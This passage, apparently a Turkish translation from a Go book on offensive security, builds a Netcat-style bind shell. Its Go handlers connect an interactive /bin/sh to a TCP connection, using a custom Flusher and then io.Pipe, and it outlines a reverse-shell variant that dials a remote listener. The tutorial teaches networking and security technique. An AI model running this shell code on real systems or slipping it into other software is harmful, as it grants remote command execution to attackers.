Bu, `Cmd` türünün bir örneğini oluşturur ancak henüz komutu yürütmez. `stdin`
ve `stdout` üzerinde oynama yapmak için birkaç seçeneğiniz vardır. Daha önce
bahsettiğimiz `Copy(Writer, Reader)` fonksiyonunu kullanabilir veya `Reader` ve
`Writer`'ı doğrudan `Cmd`'ye atayabilirsiniz. `Conn` nesnenizi doğrudan hem
`cmd.Stdin` hem de `cmd.Stdout`'a şu şekilde atayalım:

```go
cmd.Stdin = conn
cmd.Stdout = conn
```

Komut ve akışların (streams) kurulumu tamamlandığında, komutu `cmd.Run()` 
kullanarak çalıştırırsınız:

```go
if err := cmd.Run(); err != nil {
     // Handle error.
}
```

Bu mantık Linux sistemlerinde gayet güzel çalışır. Ancak programı biraz
değiştirip bir Windows sisteminde `/bin/bash` yerine `cmd.exe` çalıştırarak
çalıştırdığınızda, anonim boruların (anonymous pipes) Windows'a özgü
işlenişinden dolayı, bağlanan istemcinin hiçbir zaman komut çıktısını
alamadığını görürsünüz. Bu sorun için iki çözüm vardır.

İlk olarak, stdout'un flush edilmesini açıkça zorlayarak bu inceliği
düzeltmek için kodu değiştirebilirsiniz. `Conn`'u doğrudan `cmd.Stdout`'a
ataymak yerine, `bufio.Writer` (arabellekli writer) saran özel bir `Writer`
uygulayıp, arabelleğin zorla boşaltılması (flush) için onun `Flush` metodunu
açıkça çağırırsınız. `bufio.Writer`'ın örnek kullanımı için 35. sayfadaki
"Creating the Echo Server" bölümüne bakın.

İşte özel writer `Flusher`'ın tanımı:

```go
// Flusher wraps bufio.Writer, explicitly flushing on all writes.
type Flusher struct {
    w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer.
func NewFlusher(w io.Writer) *Flusher {
    return &Flusher{
        w: bufio.NewWriter(w),
    }
}

// Write writes bytes and explicitly flushes buffer.
func (foo *Flusher) Write(b []byte) (int, error) {
    count, err := foo.w.Write(b)
    if err != nil {
        return -1, err
    }

    if err := foo.w.Flush(); err != nil {
        return -1, err
    }

    return count, err
}
```

`Flusher` türü, veriyi alttaki arabellekli writer'a yazan ve ardından çıktıyı
flush eden bir `Write([]byte)` fonksiyonunu uygular.

Bu özel writer'ı uyguladıktan sonra, bağlantı işleyicinizi, `cmd.Stdout` için
bu `Flusher` özel türünü örnekleyip kullanacak şekilde değiştirebilirsiniz:

```go
func handle(conn net.Conn) {
    // Explicitly calling /bin/sh and using -i for interactive mode
    // so that we can use it for stdin and stdout.
    // For Windows use exec.Command("cmd.exe").
    cmd := exec.Command("/bin/sh", "-i")

    // Set stdin to our connection
    cmd.Stdin = conn

    // Create a Flusher from the connection to use for stdout.
    // This ensures stdout is flushed adequately and sent via net.Conn.
    cmd.Stdout = NewFlusher(conn)

    // Run the command.
    if err := cmd.Run(); err != nil {
        log.Fatalln(err)
    }
}
```

Bu çözüm yeterli olsa da kesinlikle zarif sayılmaz. Çalışan kod, zarif koda
göre daha önemli olsa da, bu problemi `io.Pipe()` fonksiyonunu tanıtmak için
bir fırsat olarak kullanacağız. `io.Pipe()` fonksiyonu, `Reader` ve `Writer`
bağlamak için kullanılabilen, Go'nun eşzamanlı (synchronous), bellek içi
pipe'ıdır:

```go
func Pipe() (*PipeReader, *PipeWriter)
```

`PipeReader` ve `PipeWriter` kullanmak, writer'ı açıkça flush etme ihtiyacını
ortadan kaldırır ve stdout'u TCP bağlantısına eşzamanlı olarak bağlamanızı
sağlar. `handle` fonksiyonunu bir kez daha yeniden yazacaksınız:

```go
func handle(conn net.Conn) {
    // Explicitly calling /bin/sh and using -i for interactive mode
    // so that we can use it for stdin and stdout.
    // For Windows use exec.Command("cmd.exe").
    cmd := exec.Command("/bin/sh", "-i")
    // Set stdin to our connection
    rp, wp := io.Pipe()
    cmd.Stdin = conn
    cmd.Stdout = wp
    go io.Copy(conn, rp)
    cmd.Run()
    conn.Close()
}
```

`io.Pipe()` çağrısı, eşzamanlı olarak bağlı bir reader ve writer oluşturur;
writer'a (bu örnekte `wp`) yazılan her veri, reader (`rp`) tarafından
okunur. Böylece writer'ı `cmd.Stdout`'a atar ve ardından `io.Copy(conn, rp)`
kullanarak `PipeReader`'ı TCP bağlantısına bağlarsınız. Bunu, kodun
bloklanmasını önlemek için bir goroutine kullanarak yaparsınız. Komuttan
gelen herhangi bir standart çıktı, writer'a gönderilir, sonra reader'a
aktarılır ve TCP bağlantısı üzerinden dışarıya gönderilir. Bu kadar zarif bir
çözüm nasıl?

Böylece, bir TCP dinleyicisinin bağlantı beklerken bakış açısından,
Netcat'in kocaman güvenlik açıklarından birini başarıyla uygulamış
oldunuz. Benzer mantığı, yerel bir binary'nin stdout ve stdin'ini uzak bir
dinleyiciye yönlendiren bir bağlanan istemci (connecting client) bakış
açısından bu özelliği uygulamak için de kullanabilirsiniz. Tam ayrıntılar
size bırakılmıştır, ancak muhtemelen şunları içerecektir:

- `net.Dial(network, address string)` ile uzak bir dinleyiciye bağlantı
  kurmak.
- `exec.Command(name string, arg ...string)` ile bir `Cmd` başlatmak.
- `Stdin` ve `Stdout` özelliklerini `net.Conn` nesnesini kullanacak şekilde
  yönlendirmek.
- Komutu çalıştırmak.

Bu noktada, dinleyici bir bağlantı almış olmalıdır. İstemciye gönderilen
herhangi bir veri istemci tarafında `stdin` olarak yorumlanmalı, dinleyici
üzerinde alınan herhangi bir veri ise `stdout` olarak yorumlanmalıdır. Bu
örneğin tam kodu
`https://github.com/blackhat-go/bhg/blob/master/ch-2/bzcat-exec/main.go`
adresinde mevcuttur.

## Özet

Artık Go'nun ağ programlama (networking), G/Ç (I/O) ve eşzamanlılık
(concurrency) ile ilişkili pratik uygulamalarını ve kullanımını incelediğinize
göre, kullanılabilir HTTP istemcileri oluşturmaya geçelim.

# HTTP İSTEMCİLERİ VE
## UZAK ARAÇ ETKİLEŞİMİ (REMOTE INTERACTION)
